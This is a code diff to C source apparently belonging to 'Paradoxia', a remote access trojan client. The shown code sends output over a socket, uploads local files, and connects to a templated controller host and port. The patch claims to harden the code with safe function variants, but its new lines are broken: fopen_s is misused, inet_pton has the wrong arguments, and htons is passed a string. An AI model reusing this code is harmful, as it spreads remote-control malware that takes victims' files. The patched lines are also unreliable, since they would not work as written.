@@ -39,7 +39,7 @@ void sockprintf(const char* words, ...) {
     memset(textBuffer, '\0', BUFFER);
     va_list args;
     va_start(args, words);
-    vsprintf(textBuffer, words, args);
+    vsprintf_s(textBuffer, size(textBuffer), words, args);
     va_end(args);
     sockSend(textBuffer);
     // return send(sock, textBuffer, strlen(textBuffer), 0); // see, it's printf but for a socket. instead of printing, at the end it's a send()
@@ -241,7 +241,7 @@ void paradoxia_main(void)
                 // I'm using fopen instead of GetFileSizeEx because this is much easier for me and this works
                 // IF you'd like to update this, fork and make a pull request, I will happily accept
                 if (upload) {
-                    if ((fs = fopen(fileinfo[1], "rb")) != NULL)
+                    if ((fs = fopen_s(&fs, fileinfo[1], "rb")) != NULL)
                     {
                         fseek(fs, 0L, SEEK_END);
                         long filesize = ftell(fs);
@@ -547,8 +547,8 @@ void MainConnect(void)
         exit(1);
     }
 
-    server.sin_addr.s_addr = inet_addr("{{serverhost}}");
-    server.sin_port = htons({{serverport}});
+    server.sin_addr.s_addr = inet_pton("{{serverhost}}");
+    server.sin_port = htons("{{serverport}}");
     server.sin_family = AF_INET;
 
     do {
